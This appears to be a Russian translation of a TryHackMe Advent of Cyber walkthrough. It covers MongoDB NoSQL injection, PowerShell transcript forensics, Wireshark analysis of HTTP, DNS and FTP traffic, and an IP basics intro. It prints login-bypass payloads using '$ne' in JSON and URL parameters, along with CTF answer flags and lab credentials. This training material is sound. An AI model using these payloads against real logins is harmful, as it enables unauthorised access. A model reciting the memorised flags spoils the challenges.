Теперь, когда у нас есть базовые знания о работе с командами MongoDB для создания баз данных и коллекций, а также 
для вставки, обновления и удаления документов, мы обсудим инъекцию NoSQL и риски наличия такой уязвимости в 
приложении. Инъекция NoSQL — это уязвимость веб-безопасности, которая позволяет злоумышленнику получить контроль над 
базой данных. Инъекция NoSQL происходит путем отправки запросов через ненадежный и неотфильтрованный вход 
веб-приложения, что приводит к утечке несанкционированной информации. Кроме того, злоумышленник может использовать 
инъекцию NoSQL для выполнения различных операций, таких как изменение данных, повышение привилегий, DoS -атаки и 
другие.      

### Обход страниц входа!

Логика страниц входа в систему похожа в большинстве баз данных: сначала подключаемся к базе данных, а затем ищем 
определенное имя пользователя и пароль; если они существуют в коллекции (в базе данных), то у нас есть допустимая 
запись. Ниже приведен запрос, который используется в веб-приложениях, используемых на нашей странице входа:    
функции  db.users.find({query})  или  db.users.findOne(query), где  запрос  — это данные JSON, которые отправляются 
через приложение:  {"username": "admin", "password":"adminpass"}. Обратите внимание, что когда мы предоставляем 
правильные учетные данные, возвращается документ, в то время как при предоставлении неправильных учетных данных, 
когда ничего не совпадает, возвращается нулевой ответ!          

```commandline
MongoDB
> db.users.findOne({username: "admin", password: "adminpass"})
{
        "_id" : ObjectId("6183ef6292dea43d75f0c820"),
        "id" : "1",
        "username" : "admin",
        "email" : "admin@thm.labs",
        "password" : "adminpass"
}
> db.users.findOne({username: "admin", password: "adminpasss"})
null
```

Прежде чем приступить к использованию NoSQL-инъекции, нам необходимо ознакомиться с операторами MongoDB, которые 
активно используются при инъекциях, а именно: 
```commandline
$eq — соответствует записям, которые равны определенному значению 

$ne — соответствует записям, которые не равны определенному значению 

$gt — сопоставляет записи, которые больше определенного значения. 

$where — сопоставление записей на основе условия Javascript 

$exists - сопоставляет записи, имеющие определенное поле 

$regex — сопоставляет записи, удовлетворяющие определенным регулярным выражениям. 
```
Посетите  веб-сайт MongoDB  для получения дополнительной информации об операторах MongoDB. Далее мы будем использовать логику запроса на вход, внедряя объект JSON, который включает один из операторов NoSQL, а именно  $ne . 
```commandline
MongoDB
> db.users.findOne({username: "admin", password: {"$ne":"xyz"}})
{
        "_id" : ObjectId("6183ef6292dea43d75f0c820"),
        "id" : "1",
        "username" : "admin",
        "email" : "admin@thm.labs",
        "password" : "adminpass"
}
```

Мы внедрили возражение JSON  {"$ne": "XYZ"}  в поле пароля и изменили логику следующим образом: 

Мы говорим MongoDB найти документ (пользователя) с именем пользователя, равным  admin , и его пароль,  отличный  от  
xyz ,  что превращает это утверждение в TRUE, поскольку пароль администратора не равен  xyz.  
В результате мы успешно извлекли документ из MongoDB, поскольку логика нашего утверждения верна. Применив эту 
концепцию к странице входа в веб-приложение, мы сможем обойти страницу входа. 

Теперь предположим, что мы хотим войти в систему как другой пользователь, который не является администратором. В 
этом случае мы также можем ввести в поле имени пользователя следующее: 
```commandline
MongoDB
> db.users.findOne({username:{"$ne":"admin"},password:{"$ne":"xyz"}})
{
        "_id" : ObjectId("6183ef5b92dea43d75f0c81f"),
        "id" : "2",
        "username" : "user",
        "email" : "user@thm.labs",
        "password" : "password1!"
}
```

Если бы это была страница входа, мы бы вошли как не  admin,  что является user. Мы внедрили два объекта JSON в 
поля имени пользователя и пароля: мы говорим MongoDB найти документ, в котором имя пользователя не равно admin, а 
пароль не равен xyz, что возвращает утверждение как истинное.   

### Эксплуатация NoSQL-инъекции

Чтобы использовать NoSQL-инъекцию в веб-приложении, сначала нужно найти точку входа, которая не очищает вводимые 
пользователем данные. Затем нужно понять, как веб-приложение передает запрос в базу данных! После того, как вы 
найдете точку входа, передаваемые запросы могут быть разными. Иногда веб-приложение принимает вводимые пользователем 
данные через  запросы GET  или  POST , а иногда веб-приложения принимают  объект JSON , как в случае с  API.

Внедрение запроса NoSQL имеет разные формы, если мы имеем дело с запросами GET  или  POST , чем с объектами JSON, но 
все равно имеет ту же концепцию. Давайте обсудим, как внедриться в обычные  запросы GET  или  POST. Взаимодействие 
с MongoDB через GET  или  POST  осуществляется путем внедрения массива оператора MongoDB для сопоставления 
возражения JSON , чтобы сопоставить  Key: Value . Ниже приведен пример внедрения через URL:

  http://example.thm.labs/search?username=admin&role[$ne]=user
Обратите внимание, что мы вводим оператор MongoDB [$ne] (не равно) в  параметре роли  . Мы также можем использовать 
  ту же концепцию для передачи операторов MongoDB в запросах POST.   

Мы создали площадку для веб-приложения для поиска пользователя(ей) с определенной ролью! Чтобы выполнить 
NoSQL-инъекцию, сначала нужно обойти страницу входа, как мы обсуждали в предыдущем разделе. 

Давайте рассмотрим обычный случай, когда мы ищем имя пользователя, совпадающее  с  ролью пользователя ben.  

  http://example.thm.labs/search?username=ben&role=user
В результате веб-приложение возвращает ожидаемый результат от MongoDB. Теперь давайте внедрим MongoDB, чтобы 
  показать неожиданные результаты! Мы попробуем перечислить все имена пользователей, которые имеют  роль пользователя !  

  http://example.thm.labs/search?username[$ne]=ben&role=user
В результате веб-приложение вернет много записей из MongoDB, которые удовлетворяют запросу.  Настало время практики; 
  теперь убедитесь, что вы развернули подключенную машину  и AttackBox (для использования Burp) , попробуйте 
  перечислить все имена пользователей, которые имеют  гостевые роли.  Найдите флаг и ответьте на вопрос № 2 ниже   

Вы можете получить доступ и посетить веб-сайт по следующей ссылке:  http://LAB_WEB_URL.p.thmlabs.com  или  
http://MACHINE_IP  , если вы используете AttackBox. 


Дополнительные ресурсы
Если вам интересно узнать больше об уязвимостях, связанных с инъекциями, посетите  разделы « Инъекции SQL»  и  
«Инъекции команд» на TryHackMe. 

### Ответить на вопросы ниже
Взаимодействуйте с сервером MongoDB, чтобы найти флаг. Что такое флаг?
```commandline
THM{8814a5e6662a9763f7df23ee59d944f9}
```
Мы обсудили, как обойти страницы входа в качестве администратора. Можете ли вы войти в приложение, которое 
контролирует Grinch Enterprise, как администратор и получить флаг? 

Используйте знания, полученные в AoC3, день 4, чтобы настроить и запустить прокси-сервер Burp Suite для перехвата 
HTTP-запроса для страницы входа. Затем измените параметр POST. 
```commandline
THM{b6b304f5d5834a4d089b570840b467a8}
```
После входа в систему используйте страницу поиска подарков, чтобы получить список всех имен пользователей, имеющих  
гостевые роли. Что такое флаг? 
```commandline
THM{2ec099f2d602cc4968c5267970be1326}
```
Используйте страницу поиска подарков для выполнения NoSQL-инъекции и получения записи mcskidy. Что такое запись 
details? 

```commandline
ID:6184f516ef6da50433f100f4:mcskidy:admin
```

## Задание 13
Посмотрите видеообзор Джона Хаммонда на 8-й день здесь

McSkidy получил ужасную новость! Ноутбук Санты, который он использует для подготовки своего мешка с игрушками к 
Рождеству, пропал! Мы считаем, что его украл приспешник из Grinch Enterprise, но нам нужно выяснить это наверняка. 
Нам предстоит определить, кто взломал ноутбук, и вернуть мешок с игрушками Санты!

К сожалению, у The Best Festival Company было минимальное количество инструментов мониторинга на ноутбуке Санты (он 
же босс, в конце концов)! Все, с чем нам приходится работать, это некоторые журналы транскрипции PowerShell, которые 
мы смогли восстановить удаленно сразу после его пропажи.  Вы можете найти журналы транскрипции в  SantasLaptopLogs 
папке на рабочем столе подключенной виртуальной машины Windows.

Если вы не знакомы, PowerShell Transcription Logs фиксирует ввод и вывод команд Windows PowerShell, позволяя 
аналитику просматривать, что и когда произошло. Обычно PowerShell Transcription можно включить с помощью групповой 
политики, но другой способ включить это ведение журнала — настроить реестр Windows.

Хотя вам не обязательно использовать эти команды для этой задачи, они включат ведение журнала транскрипции 
PowerShell для локального хоста, если ввести их в командной строке администратора: 
```commandline
reg add HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\ PowerShell \Transcription /v EnableTranscripting /t REG_DWORD /d 0x1 /f
reg add HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\ PowerShell \Транскрипция /v OutputDirectory /t REG_SZ /d C:/ /f
reg add HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\ PowerShell \Transcription /v EnableInvocationHeader /t REG_DWORD /d 0x1 /f
```

Реестр Windows — это большая база данных настроек и конфигураций операционной системы. Она организована по «улей», 
каждый из которых содержит «ключи» и соответствующие им «значения». Таким образом, ведение журнала PowerShell 
Transcription Logging можно включить «для каждого пользователя» через  куст реестра или по всему хосту через куст 
реестра. К счастью, на ноутбуке Санты эта функция была включена на уровне всей машины!HKEY_CURRENT_USER 
HKEY_LOCAL_MACHINE    

Обратите внимание, что для этой задачи вы будете взаимодействовать с виртуальной машиной Windows для выполнения 
анализа. Ради сюжета, это не  ноутбук  Санты... скорее, у вас есть образцы файлов, которые были восстановлены до 
кражи ноутбука.  

Дополнительные ресурсы
Если вам интересно узнать больше об основах Windows, ознакомьтесь с модулем «Основы Windows» на TryHackMe.

### Ответить на вопросы ниже
Прочитайте предпосылку выше, запустите подключенную машину анализа Windows и найдите журналы транскрипции в папке 
на рабочем столе. SantasLaptopLogs  

Если вы хотите подключиться к машине по протоколу RDP, запустите AttackBox и введите в терминал следующее: xfreerdp 
/u:Administrator /p:grinch123! /v:MACHINE_IP -  Учетные данные для машины: Administrator в качестве имени 
пользователя и grinch123! в качестве пароля.  
```commandline
Ответ не требуется
```
Каждый журнал транскрипции — это простой текстовый файл, который можно открыть в любом редакторе по вашему выбору. 
Хотя имена файлов случайны, вы можете получить представление о том, какой журнал «идет первым», посмотрев на 
атрибуты Date Modified или Date Created, или на временные метки непосредственно перед расширением файла!  

Откройте первый журнал транскрипции. Вы можете увидеть команды и вывод для всего, что было запущено в PowerShell, 
например whoamiи systeminfo! 

Какая операционная система установлена на ноутбуке Санты («Имя ОС»)?
```commandline
Microsoft Windows 11 Pro
```
Просмотрите каждый журнал транскрипций, чтобы получить представление о том, какая активность была выполнена на 
ноутбуке сразу после его пропажи. Во «втором» журнале транскрипций, похоже, что преступник создал учетную запись 
пользователя backdoor!  

Какой пароль был установлен для новой учетной записи «backdoor»?
```commandline
grinchstolechristmas
```
В одном из журналов транскрипции злоумышленник взаимодействует с целью под новой учетной записью пользователя 
бэкдора и копирует уникальный файл на рабочий стол. Перед тем, как он будет скопирован на рабочий стол, каков полный 
путь к исходному файлу?   
```commandline
C:\Users\santa\AppData\Local\Microsoft\Windows\UsrClass.dat
```
Актер использует бинарный файл Living Off The Land (LOLbin) для кодирования этого файла, а затем проверяет его 
успешность, просматривая выходной файл. Как называется этот LOLbin? 
```commandline
certutil.exe
```
Файл UsrClass.dat был закодирован с помощью Base64, который, к счастью, вы можете расшифровать и восстановить 
исходный UsrClass.dat файл! Base64 декодирует содержимое между маркерами -----BEGIN CERTIFICATE-----и -----END 
CERTIFICATE-----в журнале транскрипции с помощью CyberChef, локальная копия которого у вас есть на рабочем столе 
вашей аналитической машины.    

Этот файл может быть использован для помощи в нашем расследовании. Файл UsrClass.datсодержит «Shellbags» или 
артефакты, содержащиеся в реестре Windows, которые хранят пользовательские настройки при просмотре папок в 
графическом интерфейсе проводника Windows. Если бы вы могли вычленить эту информацию, вы могли бы получить 
представление о том, какие действия пользователя выполнялись на ноутбуке до того, как он был украден или 
скомпрометирован! Для получения более подробной информации о Shellbags вам настоятельно рекомендуется почитать или 
провести исследование. :)     

Для извлечения информации Shellbags из этого UsrClass.dat файла мы будем использовать графическую утилиту "Shellbags 
Explorer ", созданную Эриком Циммерманом. Эта утилита легко доступна в ShellBagsExplorerпапке на рабочем столе 
вашего компьютера Windows, с именем приложения ShellBagsExplorer.exe.

Прочитайте вышеизложенное и откройте ShellBagsExplorer.exe приложение, находящееся в папке на рабочем столе.
```commandline
Ответ не требуется
```
При ShellBagsExplorer.exe открытии используйте меню верхней панели, чтобы выбрать File ->  Load offline hive и 
перейти к месту, где вы сохранили декодированный  UsrClass.dat . Загрузите  UsrClass.dat файл и начните исследовать 
обнаруженные Shellbags!  

В папке «Рабочий стол» есть подозрительная папка с именем «SantaRat». Может ли это быть троян удаленного доступа, 
который использовался для дальнейшей гнусной деятельности на ноутбуке Санты? К сожалению, только из Shellbags мы 
имеем представление только об именах папок (иногда файлов, если повезет) и данных столбцов в проводнике Windows, но 
не о файлах... как мы можем узнать больше подробностей?   

Разверните папки и посмотрите, сможете ли вы найти что-нибудь, что может указать нам, как лучше отследить, что на 
самом деле представляет собой этот SantaRat. Какое конкретное имя папки намекает нам на то, что это может быть 
общедоступное программное обеспечение, размещенное на платформе совместного использования кодов?  
```commandline
.github
```
Кроме того, на рабочем столе есть уникальная папка под названием «Сумка с игрушками»! Должно быть, это то место, где 
Санта готовит свою коллекцию игрушек, и это, безусловно, конфиденциальные данные, которые актер мог 
скомпрометировать.  Как называется файл, найденный в этой папке?   
```commandline
bag_of_toys.zip
```
Найдите это программное обеспечение SantaRat в сети.  Это может быть так же просто, как поиск имени программного 
обеспечения на предложенном веб-сайте (Github). 

Обратите внимание, что аналитическая машина TryHackMe Windows не имеет доступа к Интернету, поэтому вам придется 
использовать свой собственный веб-браузер. 

Каково имя пользователя, которому принадлежит репозиторий SantaRat?
```commandline
Grinchiest
```
Исследуйте другие репозитории, которыми владеет этот пользователь. Каково название репозитория, который кажется 
особенно важным для нашего расследования? 
```commandline
operation-bag-of-toys
```
Прочитайте информацию, представленную в этом репозитории. Похоже, что актер фактически взломал и подделал мешок с 
игрушками Санты! Вы можете просмотреть активность в журналах транскрипции. Похоже, что актер установил специальную 
утилиту для сбора и, в конечном итоге, эксфильтрации мешка с игрушками. Как называется исполняемый файл, который 
установил уникальную утилиту, которую актер использовал для сбора мешка с игрушками?   
```commandline
uharc-cmd-install.exe
```
В последнем журнале транскрипции вы можете увидеть активность, которую этот актер использовал для подделки мешка с 
игрушками Санты! Похоже, что они собрали оригинальное содержимое с помощью архива UHA . Архив UHA похож на архив ZIP 
или RAR, но быстрее и с лучшими показателями сжатия. Это очень редко можно увидеть, но, похоже, Grinch Enterprises 
вытаскивают все трюки!   

Вы можете видеть, как актер сжал оригинальное содержимое сумки с игрушками с помощью пароля. К сожалению, мы не 
можем увидеть, какой именно пароль был в этих журналах транскрипции! Возможно, мы могли бы найти его в другом месте... 

После этого актер, похоже, вынул все из сумки с игрушками и добавил туда новые вещи, такие как уголь, плесень, 
червей и многое другое! Каково содержимое этих «вредоносных» файлов (уголь, плесень и все остальные)?  
```commandline
GRINCHMAS
```
Мы знаем, что актер, по-видимому, забрал оригинальный мешок с игрушками. Возможно, произошла небольшая ошибка OPSEC, 
и мы сможем восстановить мешок с игрушками Санты! Просмотрите репозиторий актера на предмет запланированных операций.
.. возможно, в сообщениях о коммите мы сможем найти оригинальный архив и пароль!
```commandline
Ответ не требуется
```
Какой пароль к оригинальному архиву bag_of_toys.uha? (Вам не нужно выполнять никаких попыток взлома или перебора пароля)
```commandline
TheGrinchiestGrinchmasOfAll
```
McSkidy удалось загрузить и сохранить копию архива  bag_of_toys.uha, и она доступна вам на рабочем столе 
анализирующей машины Windows. После раскрытия пароля от репозитория GitHub актера у вас есть все необходимое для 
восстановления оригинального мешка с игрушками Санты!!

Дважды щелкните по архиву на рабочем столе, чтобы открыть графическую утилиту извлечения UHARC, которая была 
подготовлена для вас. Используя найденный вами пароль, извлеките содержимое в место по вашему выбору (вы можете 
создать каталог "Bag of Toys" на рабочем столе, чтобы сохранить все файлы).  

Итак, вы успешно восстановили оригинальное содержимое мешка с игрушками Санты! Вы можете просмотреть их в файловом 
браузере Windows Explorer, чтобы узнать, сколько их там было. 

Сколько оригинальных файлов было в мешке с игрушками Санты?
```commandline
228
```

```commandline
Ответ не нужен
```

## Задание 14
Недавно McSkidy обнаружил, что большой объем трафика поступает в одну систему в сети. Используйте свои навыки 
анализа трафика, чтобы определить, какие виды деятельности выполняет Grinch Enterprises. 

Посмотрите видео-обучение Alh4zr3d на 9-й день  здесь
В этом задании мы познакомим вас с необходимыми навыками и знаниями для выполнения базового анализа пакетов с 
помощью Wireshark. 

Анализ пакетов — это метод, используемый для захвата и перехвата сетевого трафика, проходящего через сетевые 
интерфейсы компьютера. Анализ пакетов также может называться по-разному, например, сниффер пакетов, анализатор 
пакетов, анализатор протоколов или сетевой анализатор. Для специалиста по кибербезопасности получение навыков 
анализа пакетов является важным требованием для устранения неполадок в сети и анализа протоколов связи. Используя 
инструменты анализа сети, такие как Wireshark, он захватывает сетевые пакеты в режиме реального времени и отображает 
их в удобном для восприятия человеком формате. Он предоставляет множество дополнительных функций, включая захват в 
реальном времени и автономный анализ. Эта задача подробно описывает шаги анализа пакетов с использованием Wireshark 
для анализа различных протоколов (незашифрованных протоколов), таких как HTTP, DNS и FTP.

### Требуемые навыки и знания
Мы предполагаем, что у пользователя есть базовые навыки для выполнения этой задачи, требуются теоретические и 
практические знания, включая базовые концепции сетей, стек TCP /IP, модель OSI и TCP- рукопожатие. Это относится не 
только к анализу пакетов, но и к большинству других тем, с которыми мы будем иметь дело в кибербезопасности.  

### Инструменты анализа пакетов
Существует множество инструментов, которые используются для анализа сетевого трафика и сетевого сниффинга. Каждый из 
этих инструментов предоставляет свой способ захвата или анализа трафика. Некоторые предлагают способы копирования и 
захвата, в то время как другие считывают и поглощают, используя разные интерфейсы. В этой комнате мы рассмотрим 
Wireshark.  Помните, что для этих инструментов требуются права администратора.   

### Что такое Wireshark?
Wireshark предустановлен на THM AttackBox, и вы можете просто запустить THM AttackBox, нажав кнопку Start AttackBox 
и открыв Wireshark. 

Если вы хотите выполнить это задание на своем компьютере, Wireshark можно загрузить здесь: Загрузить Wireshark

Для этой задачи мы подготовили файл PCAP для загрузки и следуйте инструкциям, а также применяйте необходимые навыки 
анализа пакетов, используя различные сценарии. Если вы используете AttackBox, вам не нужно загружать файл, так как 
он уже есть на машине; файл AoC3.pcap находится в следующем месте: /root/Rooms/AoC3/Day9/AoC3.pcap.   

Мы можем запустить Wireshark и импортировать предоставленный файл PCAP следующим образом:

Терминал
```commandline
user@thm$ sudo wireshark /root/Rooms/AoC3/Day9/AoC3.pcap
```

Интерфейс Wireshark состоит из пяти основных компонентов: Меню команд — это стандартные выпадающие меню, 
расположенные в верхней части окна. Сейчас нас интересуют меню Файл и Захват. Меню Файл позволяет сохранить 
захваченные данные пакетов или открыть файл, содержащий ранее захваченные данные пакетов, и выйти из приложения 
Wireshark.   

Раздел  фильтра отображения — это то место, где мы можем указать правила для поиска определенных пакетов. Список  
захваченных пакетов показывает все отправленные и полученные сетевые пакеты. Этот раздел включает важные поля, 
которые используются в разделе фильтра, такие как исходные и конечные IP-адреса, протоколы и информация. Далее, 
сведения  о выбранном заголовке пакета . Этот раздел показывает сведения о выбранных сетевых пакетах и показывает 
все заголовки, включая информацию обо всех уровнях TCP . Наконец,  содержимое пакета , которое показывает содержимое 
пакета в шестнадцатеричном и ASCII-формате.        



### Фильтры
Синтаксис Berkeley Packet Filter (BPF)  используется в пакетных анализаторах для фильтрации определенных пакетов 
перед захватом. Фильтрация пакетов полезна при поиске информации в процессе захвата пакетов. Синтаксис Wireshark — 
это основной метод, который мы будем использовать в этой комнате для поиска определенных протоколов и информации. 
Ниже мы включили несколько примеров использования фильтров отображения Wireshark:   

Предположим, что мы ищем все пакеты, которые были отправлены или получены следующим IP-адресом: 172.21.2.116. 
Таким образом, следующий фильтр помогает нам отобразить все сетевые пакеты, которые имеют IP-адрес 172.21.2.116 :  
ip.addr == 172.21.2.116   



В результате мы видим, что нам удалось отобразить только те пакеты, которые нам были нужны.

Далее мы также можем указать определенные протоколы, например HTTP, показывая все пакеты для этого протокола. Мы 
также можем указать доменное имя, чтобы сузить поиск. Следующий пример показывает, что мы ищем HTTP-пакеты, 
которые имеют  доменное имя google.com: http содержит google.com   



Далее мы также можем посмотреть на определенный порт. Давайте попробуем отфильтровать и составить список всех 
пакетов для протокола удаленного рабочего стола. Мы можем сделать это с помощью  tcp.port  :  tcp.port == 3389  



Однако предположим, что вы отслеживаете сетевой трафик и хотите исключить пакеты RDP. В этом случае мы можем 
использовать правило not Wireshark, как показано ниже. 



Далее мы применим технику анализа пакетов с использованием Wireshark для различных протоколов, включая HTTP, FTP и DNS. 

Примечание : Обязательно откройте инструмент Wireshark и импортируйте файл AoC3.pcap для отслеживания содержимого.

### HTTP №1 — ПОЛУЧИТЬ

Мы выполним анализ пакетов на предварительно захваченных сетевых пакетах в PCAP для анализа трафика HTTP. После 
того, как мы откроем PCAP с помощью Wireshark, он покажет много сетевого трафика, поскольку мы подключаемся по 
протоколу RDP, что усложнит нашу работу. Однако мы будем использовать фильтр Wireshark, чтобы сосредоточиться только 
на веб-запросах. В этом случае мы имеем дело с протоколом  HTTP  . Поэтому мы можем использовать правила Wireshark, 
чтобы упростить задачу. Мы можем применить следующее правило к фильтру Wireshark, чтобы показать только трафик HTTP: 
http.     

На следующем рисунке показан весь HTTP-трафик, который был отправлен на веб-сервер и с него. В первом пакете мы 
видим, что веб-запрос отправляется с нашей машины  192.168.100.95   на веб-сервер, который также является нашей 
машиной. В разделе информации мы также видим, что мы отправили  запрос GET  , пытаясь получить  содержимое /admin  . 
В следующем пакете веб-сервер ответил отправителю кодом ответа HTTP  404,  что означает, что он  не найден.  
Предположим, нам нужны дополнительные сведения о конкретном пакете. В этом случае мы можем развернуть (используя 
знак >)  поддерево протокола передачи гипертекста  для получения дополнительных сведений о запросе отправителя, 
таких как IP-адрес хоста, веб-агент пользователя и другая информация.      



Мы можем  указать  метод HTTP . В этом случае мы можем  указать  , чтобы показать все запросы GET, используя 
следующий  фильтр :  http.request.method == GET .  Продолжайте отслеживать  запросы GET HTTP и ответьте на вопрос в этом задании.  

### HTTP #1 - POST

Во втором сценарии мы проверяем HTTP POST-запросы, используемые для входа на веб-портал. В этом разделе мы выполним 
анализ пакетов, чтобы захватить имя пользователя и пароль POST-запроса. Обязательно откройте файл PCAP, чтобы 
выполнить анализ пакетов. Ваша цель в этом разделе — проверить HTTP-пакет, чтобы получить имя пользователя и пароль. 
Для получения более подробной информации дважды щелкните нужный пакет, содержащий POST-запрос. Мы можем увидеть всю 
необходимую нам информацию в шестнадцатеричном разделе в открытом тексте. Кроме того, есть и другие способы, которые 
показывают больше информации о HTTP-запросе, а именно отслеживание HTTP-потока. Мы можем сделать это, щелкнув правой 
кнопкой мыши нужный пакет и выбрав  follow -> TCP Stream,  чтобы увидеть веб-запросы и их подробности.      

В этом разделе нам необходимо найти запрос POST и изучить всю информацию пакета, чтобы ответить на вопросы 2 и 3 в 
этой задаче. 

### DNS

DNS похож на гигантскую телефонную книгу, которая берет URL (например, https://tryhackme.com/) и превращает его в 
IP-адрес. Это означает, что людям не нужно запоминать IP-адреса своих любимых веб-сайтов. 

Предоставленный файл PCAP содержит пакеты DNS, полученные нашим сервером. Доменное имя, которое мы рассмотрим, —  
packet.tryhackme.com . Обратите внимание, что это доменное имя, используемое в файле PCAP в качестве примера.  

Сначала убедитесь, что вы открыли файл PCAP. Затем, используя фильтр Wireshark, мы укажем пакеты DNS. Это можно 
сделать с помощью  фильтра udp.port  . По умолчанию протокол DNS работает на порту UDP 53 и иногда на порту TCP 53. 
В этой задаче мы будем использовать порт UDP. Таким образом, фильтр Wireshark будет следующим:  udp.port == 53  или  
только dns  .   



Дважды щелкнув по первому DNS- пакету, мы увидим следующее:



Раскрывая  поддерево Domain Name System (query)  , становится очевидным, что этот пакет является вопросом  
Questions: 1 , где клиент запрашивает доменное имя и ищет ответ от сервера. Также, проверяя поддерево Queries, мы 
можем увидеть, что клиент запрашивает   запись  типа A доменного имени packet.tryhackme.com  .  

Далее мы рассмотрим ответ на DNS-запрос. Обратите внимание, что в Wireshark в запросе, который является первым 
DNS-запросом, в информационном поле мы видим идентификатор транзакции со значением  query 0xef8e .  Обратите 
внимание, что этот номер ссылки на запрос может отличаться в вашей ситуации . Таким образом, этот номер ссылки на 
запрос используется для поиска правильного ответа DNS этого запроса. Чтобы подтвердить это, проверьте раздел полей, 
где отображается  ответ на запрос 0xef8e A packet.tryhackme.com .    



Дважды щелкнув по нужному пакету, мы увидим, что у него есть раздел ответов, где есть ответ на наш запрос, который 
является Address:  127.0.0.1 . Это означает, что  DNS-запрос  типа  A packet.tryhackme.com   —  127.0.0.1 .  
Обратите внимание, что файл PCAP может иметь другие IP-адреса или дополнительные пакеты, которые не обсуждались. В 
файле PCAP были сгенерированы  и другие DNS- запросы. Теперь углубимся в DNS- запросы и ответы в Wireshark и ответим 
на вопрос 4 в этом задании.    

### FTP

Предоставленный файл PCAP содержит  пакеты FTP  , которые были получены нашим сервером. Для этой задачи мы 
рассмотрим  трафик FTP  в Wireshark. Как и в случае с другими протоколами,  мы будем использовать фильтры Wireshark 
для просмотра пакетов FTP . По умолчанию сервер FTP прослушивает порт TCP 21. Поэтому мы фильтруем и перечисляем все 
пакеты FTP , используя следующий фильтр:  ftp  или  tcp.port == 21    

На следующем рисунке показаны все пакеты FTP, и мы можем увидеть все детали пакета, проверив раздел полей. Очевидно, 
что отправитель подключен к серверу FTP, и сервер ответил заголовком сервера FTP,  vsFTPd 3.0.3 . Затем пользователь 
отправил запрос FTP с  tryhackftp  в качестве команды пользователя, которая является именем пользователя сервера FTP .  



Продолжайте проверять пакеты FTP в Wireshark и ответьте на вопросы 5 и 6 в этом задании. Мы также можем показать все 
команды FTP, выбрав первый пакет FTP и щелкнув по нему правой кнопкой мыши. Затем выберите  follow -> TCP -Steam .  

Пользователь вошел на FTP-сервер, используя имя пользователя и пароль, и загрузил секретный файл. Таким образом, 
текущий фильтр Wireshark не покажет пакет фактически загруженного файла. Вместо этого мы можем использовать фильтр  
Wireshark ftp-data  для вывода списка пакетов, содержащих содержимое файла. Примените этот фильтр и ответьте на 
последний вопрос в этой задаче.   

### Ответить на вопросы ниже
Какой каталог находится на веб-сервере в  разделе HTTP #1 - GET -запросы?
```commandline
login
```
Какое имя пользователя и пароль используются на странице входа в  разделе HTTP #2 - POST ? 
```commandline
McSkidy:Christmas2021!
```
Какое имя User-Agent было отправлено в разделе HTTP #2 - POST ?
```commandline
TryHackMe-UserAgent-THM{d8ab1be969825f2c5c937aec23d55bc9}
```
В разделе DNS есть запрос DNS TXT. Какой флаг в сообщении этого запроса DNS?
```commandline
THM{dd63a80bf9fdd21aabbf70af7438c257}
```
Какой пароль для входа на FTP в разделе FTP?
```commandline
TryH@ckM3!
```
Какая команда FTP используется для загрузки файла secret.txt в разделе FTP?
```commandline
STOR
```
Каково содержимое файла secret.txt в разделе FTP?
```commandline
123^-^321
```

## Задание 15
McSkidy пытается выяснить, как злоумышленникам удалось проникнуть в сеть и нанести ущерб инфраструктуре Best 
Festival Company. Она решила начать проводить оценку безопасности своих систем, чтобы выяснить, как Grinch 
Enterprises удалось нанести этот ущерб. Она начала с проведения оценки безопасности своих систем, чтобы выяснить, 
как Grinch Enterprises удалось нанести этот ущерб, и задается вопросом, какой сервис они использовали.

Прежде чем Макскиди начнет запускать Nmap, давайте рассмотрим некоторые ключевые слова, связанные с ее задачей. 
Если вы знакомы с терминами IP-адрес, протокол, сервер и номер порта, можете смело пропустить следующие три раздела 
и начать прямо с раздела Nmap.

Посмотрите видео-обучение Филипа Уайли на 10-й день здесь

### IP-адреса
Каждый компьютер (хост), подключающийся к сети, должен иметь логический адрес. Например, хостом может быть любая 
система с доступом к сети, например, ноутбук, смартфон и Raspberry Pi. Мы называем этот адрес логическим, потому что 
он назначается программным обеспечением и может со временем меняться, например, когда хост подключается к новой сети.
Логическим адресом в данном случае является IP-адрес.   

IP означает Internet Protocol (протокол Интернета). Для простоты мы рассмотрим Internet Protocol версии 4 (IPv4). 
Адрес IPv4 состоит из 4 десятичных чисел. Диапазон для каждого числа — от 0 до 255. Примеры адресов IPv4: 
```commandline
192.168.0.10
172.16.0.100
10.10.11.12
1.1.1.1
```

Первые 3 IP-адреса в списке выше являются частными, что означает, что доступ к ним возможен только из частной сети, 
к которой они принадлежат. Последний IP-адрес, 1.1.1.1, является публичным IP-адресом, к которому может получить 
доступ весь Интернет, и принадлежит Cloudflare.  

Некоторые IP-адреса служат особой цели. Например, 127.0.0.1 часто называют «адресом обратной связи» или «локальным 
хостом». По умолчанию любой пакет или трафик, направленный на этот адрес, не покинет хост. 

В Microsoft Windows один из способов узнать свой IP-адрес — запустить  ipconfig командную строку или PowerShell. В 
Linux и macOS вы можете узнать свой IP-адрес, выполнив  ip address show в терминале. Обратите внимание, что  ip 
будут приниматься сокращения аргументов, такие как  ip addr show или даже  ip a s.  

Терминал
```commandline
user@TryHackMe$ ip addr show
1: lo: mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: wlp1s0: mtu 1500 qdisc noqueue state UP group default qlen 1000
    link/ether 80:30:49:c8:28:b3 brd ff:ff:ff:ff:ff:ff
    inet 192.168.0.202/24 brd 192.168.0.255 scope global dynamic noprefixroute wlp1s0
       valid_lft 84435sec preferred_lft 84435sec
    inet6 fe80::c3:6a8f:ff22:cff/64 scope link noprefixroute
       valid_lft forever preferred_lft forever
```

Вывод терминала выше показывает, что в этой системе Linux имеется беспроводной адаптер с IP-адресом  192.168.0.202.

Если вы хотите узнать больше о компьютерных сетях, мы рекомендуем  модуль «Основы сетей».

### Протоколы и серверы
Допустим, мы хотим создать веб-сайт и сделали его доступным для всего Интернета. Чтобы сделать наш веб-сайт 
доступным для пользователей в Интернете, необходим публичный IP-адрес. Веб-сервер — это программа, которая 
прослушивает входящие соединения, обычно от веб-браузеров, и отвечает на их запросы.  

Сервер обычно относится к компьютерной системе, которая предоставляет услуги другим клиентам, т. е. другим 
компьютерам, по сети. Примеры услуг включают обслуживание веб-страниц, доставку электронной почты и организацию 
видеоконференций.  

Для связи клиентского компьютера с сервером необходимо следовать определенному протоколу. Рассмотрим следующую 
